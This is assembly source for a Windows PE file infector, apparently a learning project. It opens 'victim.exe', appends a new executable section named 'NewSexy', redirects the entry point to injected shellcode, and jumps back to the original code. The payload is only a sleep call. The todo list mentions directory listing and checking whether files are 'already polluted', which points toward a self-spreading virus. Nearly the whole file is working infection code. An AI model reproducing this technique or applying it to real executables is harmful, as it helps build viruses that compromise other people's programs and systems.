.486
.model	flat, stdcall
option	casemap:none

include	c:\masm32\include\windows.inc
include	c:\masm32\include\kernel32.inc
include	c:\masm32\include\user32.inc
include	c:\masm32\include\msvcrt.inc

includelib	c:\masm32\lib\kernel32.lib
includelib	c:\masm32\lib\user32.lib
includelib	c:\masm32\lib\msvcrt.lib

;todo:
;full english var + comments
; replace offset by addr when possible or lea
;dynamic loadlib shellcode
;listing directory
;non-masm version
;check if the exe is already polluted

.data

;shellcode sleep(4919)
shellcode 										db 33h, 192, 66h, 184,37h, 13h, 50h , 184, 42h, 24h, 80h, 7ch,  255, 208,  233,0 
patOnError 									db "Error code: ", 0
patOnSuccess 									db "Success", 13, 10, 0
patNameOfFile									db "Polluting file: ", 0
patNewLine									db 13,10,0
patDebug										db "--DEBUG--", 13, 10, 0
patAddrImageDosHeader							db "Address of IMAGE DOS HEADER: ", 0
patImageDosHeader								db "IMAGE DOS_HEADER: ", 0
patAddrImageNtHeader							db "Address of IMAGE_NT_HEADER: ", 0
patImageNtHeader								db "IMAGE_NT_HEADER: ", 0
patOldEntryPoint								db "Old EntryPoint: ", 0
patNewEntryPoint								db "New Entry Point: ",0
patAddrNumberOfSections							db "Address of Number of Sections: ", 0
patNumberOfSections								db "Number of sections: ", 0
patAddrImageSectionHeader						db "Address of ImageSectionHeader: ", 0
patImageSectionHeader							db "Image Section Header: ", 0
patSizeOfSection								db "Size of Section: ", 0
patSectionAlignment								db "SectionAlignment: " , 0
patNewSectionVirtualAddr							db "New Section Virtual Address: ", 0
patSizeOfRawData								db "Size of Raw Data: ", 0
patSectionVirtualSize								db "Section->VirtualSize : ", 0
patDecalage									db "Decalage: ", 0
patSizeDifference								db "Difference:", 0

patPutPtr 										db "%p addr",13,10, 0
patPutInt 										db "%i deci",13,10, 0
patPutHexa									db "%x hexa", 13, 10, 0
patPutStr 										db "%s string",13,10, 0

filename 										db  "victim.exe", 0
sectionName 									db "NewSexy", 0
shellcodeNop									db "\x90", 0

.data?

;infosExecutable dd ? 
infosPE    										dd ?
sectionSize 									dd ?
executableHandle 								HANDLE ?
executableMap 									HANDLE ?
executableEnMemoire 							LPVOID ?
filePointer 										HANDLE ?

ptrEntryPoint  									dd ?
pointerSizeOfImage 								dd ?
sectionAlignment 								dd ?
fileAlignment 									dd ?
oldEntryPoint 									dd ?
pointerNumberOfSection 							dd ?
numberOfSection 								dw ?
infosSection 									dw ?

pointerToRaw 									dd ?
decalage										dd ?
sizee											dd ?
sizeDifference									dd ?

.code
start:

;long sectionSize = strlen(shellcode) + (sizeof(DWORD)); 
;size du shellcode +  old entrypoint  

push	offset shellcode
call		crt_strlen
mov	sectionSize , eax
add		sectionSize, sizeof DWORD

push	offset filename
call		pollute
cmp	eax, 0
jne		exiterror

exit:
invoke	crt_printf,  offset patOnSuccess
invoke	ExitProcess, 0

exiterror:
invoke	crt_printf,  offset patOnError
call		GetLastError
invoke	crt_printf, offset patPutInt, eax
invoke	ExitProcess, 1

;seems to work one shot \o/, to verify
alignOn	proc alignment: DWORD, value: DWORD 
xor		 edx, edx
mov 	eax, value
div		alignment
cmp	edx, 0										;remainder of div is stocked in edx, result in eax
je		perfect										; if (!(value%alignment)) return value

inc		eax
mul		alignment 
jmp		bye 											; else return ((value/alignment) + 1) * (alignment)

perfect:
mov	eax, value
bye:
ret		8
alignOn	endp

pollute	proc filename1 : DWORD

;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
invoke	crt_printf, offset patNameOfFile
invoke	crt_printf, filename1
invoke	crt_printf, offset patNewLine
;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;saving non rdy for use registers
push	ebx
push	edi
push	esi

; Opens file for both read and write                                                                                                                                                                   
mov	eax, GENERIC_WRITE
or            eax, GENERIC_READ
invoke     CreateFile, filename1, eax, 0, 0, OPEN_EXISTING, 0, 0
mov	executableHandle, eax 
cmp	eax,  INVALID_HANDLE_VALUE
je		exitpolluteerror

invoke	CreateFileMapping,  executableHandle, 0, PAGE_READWRITE, 0, 0, 0
mov	executableMap, eax
cmp	eax,  INVALID_HANDLE_VALUE
je		exiterror
cmp	eax, NULL
je		exitpolluteerror

invoke	MapViewOfFile, executableMap, FILE_MAP_ALL_ACCESS, 0, 0, 0
mov	executableEnMemoire, eax
cmp	eax, NULL
je		exiterror



mov	ebx, eax
assume	ebx: ptr IMAGE_DOS_HEADER
cmp	[ebx].e_magic, IMAGE_DOS_SIGNATURE
jne		exitpolluteerror

;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
invoke crt_printf, offset patDebug
invoke crt_printf, offset patPutPtr, executableEnMemoire
invoke crt_printf, offset patPutPtr, executableHandle
invoke crt_printf, offset patPutPtr, executableMap

; invoke	crt_printf, offset patAddrImageDosHeader
; invoke	crt_printf, offset patPutPtr, ebx
; invoke	crt_printf, offset patImageDosHeader
; invoke	crt_printf, offset patPutPtr, [ebx]
;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; ebx += [ebx].e_lfanew
; we point now on IMAGE_NT_HEADER
add		ebx, [ebx].e_lfanew
assume	ebx: ptr IMAGE_NT_HEADERS
cmp	[ebx].Signature,  IMAGE_NT_SIGNATURE
jne		exitpolluteerror

;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patAddrImageNtHeader
; invoke	crt_printf, offset patPutPtr, ebx
; invoke	crt_printf, offset patImageNtHeader
; invoke	crt_printf, offset patPutPtr, [ebx]
;;;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
; esi = OptionalHeader
lea		esi, [ebx].OptionalHeader
assume	esi :ptr IMAGE_OPTIONAL_HEADER
 
;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
mov	ptrEntryPoint, esi
add		ptrEntryPoint, 10h

;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patOldEntryPoint
; mov	eax, ptrEntryPoint
; mov	eax, [eax]
; invoke	crt_printf, offset patPutPtr, eax
;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;PDWORD pointerSizeOfImage = &infosPE->OptionalHeader.SizeOfImage;
mov	pointerSizeOfImage, esi
add		pointerSizeOfImage, 38h

;DWORD sectionAlignment = infosPE->OptionalHeader.SectionAlignment;
mov	eax,  [esi].SectionAlignment
mov	sectionAlignment, eax

;DWORD fileAlignment = infosPE->OptionalHeader.FileAlignment;
mov	eax,  [esi].FileAlignment
mov	fileAlignment, eax

;DWORD oldEntryPoint = infosPE->OptionalHeader.AddressOfEntryPoint;
mov	eax,  [esi].AddressOfEntryPoint
mov	oldEntryPoint, eax

; edi = FileHeader
lea		edi, [ebx].FileHeader
assume	edi :ptr IMAGE_FILE_HEADER

;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patNumberOfSections
; invoke	crt_printf, offset patPutInt,  [edi].NumberOfSections
;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;PWORD pointerNumberOfSection = &infosPE->FileHeader.NumberOfSections;
mov	pointerNumberOfSection, edi
add		pointerNumberOfSection, 02h


;WORD numberOfSection = &infosPE->FileHeader.NumberOfSections;
mov	ax, [edi].NumberOfSections
mov	numberOfSection, ax


assume	ebx : nothing


;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patAddrNumberOfSections
; invoke	crt_printf, offset patPutPtr, ebx
; mov eax, [ebx]
; invoke	crt_printf, offset patPutPtr, eax
;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;addr IMAGE_SECTION_HEADER  = addr IMAGE_NT_HEADERS + sizeof(IMAGE_NT_HEADERS)
;PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS));
add		ebx, sizeof IMAGE_NT_HEADERS

;;;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patAddrImageSectionHeader
; invoke	crt_printf, offset patPutPtr, ebx
; invoke	crt_printf, offset patImageSectionHeader
; mov 	eax, [ebx]
; invoke	crt_printf, offset patPutPtr, eax
;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
; ebx  pointe sur la fin des secitons headers
mov 	eax, sizeof IMAGE_SECTION_HEADER
mul 	numberOfSection
add		ebx, eax

;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patAddrImageSectionHeader
; invoke	crt_printf, offset patPutPtr, ebx
; invoke	crt_printf, offset patImageSectionHeader
; mov	eax, [ebx]
; invoke	crt_printf, offset patPutPtr, eax
;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; we can now set our new section

;nbsections++
inc		[edi].NumberOfSections

;*pointerSizeOfImage += sectionSize;
mov 	eax, pointerSizeOfImage
mov 	ecx, sectionSize
add 	[eax], ecx
;printf new sizeOfImage;push [eax];push offset varPutInt;call crt_printf

;setting our new section info
assume	ebx: ptr IMAGE_SECTION_HEADER

;strcpy((char*)notreSection->Name,nomSection);
push 	offset sectionName
push	ebx 
call		crt_strcpy

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;to test;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;newSection->Misc.VirtualSize = AligneOn(sectionAlignment, sectionSize);

;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patSizeOfSection
; invoke	crt_printf, offset patPutInt, sectionSize
; invoke	crt_printf, offset patSectionAlignment
; invoke	crt_printf, offset patPutInt, sectionAlignment
;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


push	sectionSize
push 	sectionAlignment
call		alignOn
mov	 [ebx].Misc, eax

;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patSectionAlignment
; invoke	crt_printf, offset patPutHexa, sectionAlignment
; invoke	crt_printf, offset patSectionVirtualSize
; invoke 	crt_printf, offset patPutHexa, [ebx].Misc
;;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;	newSection->VirtualAddress = AligneSur(sectionAlignment,(infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
mov	ecx, ebx
sub		ecx, sizeof IMAGE_SECTION_HEADER
assume	ecx: ptr IMAGE_SECTION_HEADER

mov	eax, [ecx].Misc ;virtualSize
add		eax, [ecx].VirtualAddress ; +virtualAdress

assume	ecx: nothing

;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;
push	eax
invoke	crt_printf, offset patDebug
pop		eax
push	eax
invoke	crt_printf, offset patPutHexa, eax
pop		eax
push	eax
invoke	crt_printf, offset patPutInt, eax
pop		eax
;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;

push	eax
push	sectionAlignment
call		alignOn
mov	[ebx].VirtualAddress, eax

;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patNewSectionVirtualAddr
; invoke	crt_printf, offset patPutPtr, [ebx].VirtualAddress
;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;notreSection->SizeOfRawData = AligneSur(fileAlignment,sectionSize);
push	sectionSize
push	fileAlignment
call		alignOn
mov 	[ebx].SizeOfRawData, eax 

;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; invoke	crt_printf, offset patSizeOfRawData 
; invoke	crt_printf, offset patPutHexa, [ebx].SizeOfRawData
;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;notreSection->PointerToRawData = AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
mov	ecx, ebx
sub		ecx, sizeof IMAGE_SECTION_HEADER
assume	ecx: ptr IMAGE_SECTION_HEADER
mov 	eax, [ecx].SizeOfRawData
add		eax, [ecx].PointerToRawData
assume	ecx:nothing
push	eax
push	fileAlignment
call		alignOn
mov 	[ebx].PointerToRawData, eax

mov	[ebx].PointerToRelocations, 0
mov	[ebx].PointerToLinenumbers, 0
mov	[ebx].NumberOfRelocations, 0
mov	[ebx].NumberOfLinenumbers,  0


mov	eax, IMAGE_SCN_MEM_READ
add		eax, IMAGE_SCN_MEM_WRITE
add		eax, IMAGE_SCN_MEM_EXECUTE
mov	[ebx].Characteristics,  eax

;;;;;;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;
invoke	crt_printf, offset patNewEntryPoint
mov	eax, [ebx].VirtualAddress
invoke	crt_printf, offset patPutPtr, eax 
;;;;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;

;*ptrEntryPoint = notreSection->VirtualAddress;
mov	 eax, [ebx].VirtualAddress
mov	ecx, ptrEntryPoint
mov	[ecx], eax

;decalage = oldEntryPoint - ( (ptrEntryPoint + sectionSize) )
mov	eax, oldEntryPoint
sub		eax, ptrEntryPoint
sub		eax, sectionSize
mov	decalage, eax

;;;;;;;;;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
invoke	crt_printf, offset patDecalage 
invoke	crt_printf, offset patPutHexa, decalage
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; DWORD sizee;
; long sizeDifference = (AligneSur(fileAlignment,sectionSize) - sectionSize);
push	sectionSize
push	fileAlignment
call		alignOn
sub		eax, sectionSize
mov	sizeDifference, eax

;;;;;;;;;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;OK
invoke	crt_printf, offset patSizeDifference 
invoke	crt_printf, offset patPutHexa, sizeDifference
invoke	crt_printf, offset patPutInt, sizeDifference


invoke crt_printf, offset patDebug
invoke crt_printf, offset patPutPtr, executableEnMemoire
invoke crt_printf, offset patPutPtr, executableHandle
invoke crt_printf, offset patPutPtr, executableMap
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

push	[ebx].PointerToRawData										;save PointerToRawData
invoke	UnmapViewOfFile, executableEnMemoire 
cmp	eax, 0
je		exitpolluteerror

invoke	CloseHandle, executableHandle
cmp	eax, 0
je		exitpolluteerror

invoke	CloseHandle, executableMap
cmp	eax, 0
je		exitpolluteerror


;CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );

;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
invoke	crt_printf, offset patDebug
call		GetLastError
invoke	crt_printf, offset patPutInt,  eax
;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

push	0
push	FILE_ATTRIBUTE_NORMAL
push	OPEN_ALWAYS
push	0
push	FILE_SHARE_WRITE
push	GENERIC_WRITE
push	filename1
call		CreateFile

mov 	filePointer, eax													
cmp	eax, INVALID_HANDLE_VALUE
je		exitpolluteerror

;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
invoke	crt_printf, offset patDebug
call		GetLastError
invoke	crt_printf, offset patPutInt,  eax
;;;;;;;;;;;;;;;;;;; END EBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

pop		eax 													; restore PointerToRawData
invoke	SetFilePointer, filePointer, eax, 0, FILE_BEGIN
;cmp	eax, INVALID_SET_FILE_POINTER + GetLastError ROFL@MICROSOFT
;je		exitpolluteerror



; WriteFile, filePointer, offset shellcode, (strlen(shellcode) + 0), &sizee, NULL				;writing the shellcode on pointerToRawData
push	0
push	offset sizee
invoke	crt_strlen, offset shellcode	
push 	eax
push	offset shellcode
push	filePointer
call		WriteFile
cmp	eax, 0

;invoke    WriteFile, filePointer, &decallage, sizeof(DWORD), &size, NULL							;writing jmp operand oldEntryPoint
push	0
push	offset sizee
push	sizeof DWORD
push	offset decalage
push	filePointer
call		WriteFile


;fill the rest with nop in order to have the same size as we put in the header info
push	ecx
mov	ecx,	sizeDifference
myloop:
	push ecx
	invoke	WriteFile, filePointer, offset shellcodeNop, 1, offset sizee, 0
	pop	ecx
loop	myloop
pop		ecx

invoke	CloseHandle, filePointer
;invoke	crt_printf, offset patDebug

cmp	eax, 0
je		exitpolluteerror

mov	eax, 0
jmp		doleave

exitpolluteerror:
mov	eax, 1

doleave:
;restoring non rdy for use registers
pop		esi
pop		edi
pop		ebx

ret
pollute endp

end start